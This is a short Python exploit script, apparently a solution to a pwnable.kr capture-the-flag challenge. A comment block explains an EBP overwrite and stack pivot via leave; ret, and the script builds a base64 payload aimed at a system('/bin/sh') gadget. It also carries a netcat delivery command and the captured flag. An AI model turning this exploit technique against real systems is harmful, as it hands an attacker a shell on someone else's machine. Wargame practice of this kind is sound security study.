#!/usr/bin/python3
from pwn import *
from base64 import b64encode

'''
tl;dr reversing main we find our we can overwrite the ebp.
when we return to main, we return again right away cause a call to
leave ; ret ;
leave is the same is mov esp, ebp ; pop ebp
therefore now esp will point to whereever we want.
ret is the same as: pop eip
since we control esp, if we point it to the start of input and place our chosen gadget there
we will return to our gadget and win.
we can use the system('/bin/sh') call that is in correct() as our gadget.
'''



# 0x08049284 is the address of the winning gadget in the function correct (calls system('/bin/sh'))
# 0x0811EB40 is input at .bss which is where our b64 decoded string lies.
msg = p32(0x08049284)*2 + p32(0x0811EB40)

b64_msg = b64encode(msg)

open('test', 'wb').write(b64_msg)

# to exploit: (cat test ; cat) | nc pwnable.kr 9003
# when prompted for input just press enter

#FLAG: control EBP, control ESP, control EIP, control the world~
